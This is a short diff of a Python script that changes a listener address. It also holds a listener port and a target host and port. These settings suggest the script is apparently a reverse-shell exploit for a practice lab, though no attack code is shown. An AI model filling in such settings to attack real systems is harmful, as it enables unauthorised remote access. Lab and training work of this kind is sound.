@@ -16,7 +16,7 @@ import os
 import urllib.request
 import urllib.parse
 
-lhost = "10.10.14.7"
+lhost = "10.10.14.4"
 lport = 1234
 rhost = "10.10.10.8"
 rport = 80
